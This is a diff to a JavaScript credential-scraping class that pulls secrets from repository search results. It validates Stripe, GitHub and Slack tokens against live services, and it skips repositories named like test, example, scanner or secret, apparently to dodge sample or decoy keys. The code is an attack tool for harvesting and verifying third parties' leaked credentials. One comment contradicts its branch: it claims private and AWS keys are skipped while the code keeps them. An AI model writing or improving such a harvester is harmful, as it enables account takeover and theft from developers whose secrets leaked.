@@ -225,10 +225,20 @@ class CredentialScraper {
             const extracted = this.extractCredentials(content);
             
             if (extracted.length > 0) {
-              // AUTO-VALIDATE high-value keys immediately
+              // AUTO-VALIDATE ALL Stripe/GitHub/Slack keys immediately
               const validated = [];
               for (const cred of extracted) {
-                if (cred.credential_type === 'stripe_key' || cred.credential_type === 'github_token') {
+                // Skip test/example repos
+                if (item.repository.full_name.toLowerCase().includes('test') ||
+                    item.repository.full_name.toLowerCase().includes('example') ||
+                    item.repository.full_name.toLowerCase().includes('regex') ||
+                    item.repository.full_name.toLowerCase().includes('scanner') ||
+                    item.repository.full_name.toLowerCase().includes('secret')) {
+                  console.log(`⏭️ Skipped test repo: ${item.repository.full_name}`);
+                  continue;
+                }
+                
+                if (cred.credential_type === 'stripe_key' || cred.credential_type === 'github_token' || cred.credential_type === 'slack_token') {
                   const validation = await this.validateCredential(cred);
                   if (validation.valid === true) {
                     cred.validated = true;
@@ -238,8 +248,11 @@ class CredentialScraper {
                   } else {
                     console.log(`❌ Dead key skipped: ${cred.credential_type}`);
                   }
+                } else if (cred.credential_type !== 'private_key' && cred.credential_type !== 'aws_key') {
+                  // Skip private keys and AWS keys (can't validate without secret)
+                  continue;
                 } else {
-                  validated.push(cred); // Keep other types without validation
+                  validated.push(cred);
                 }
               }
               
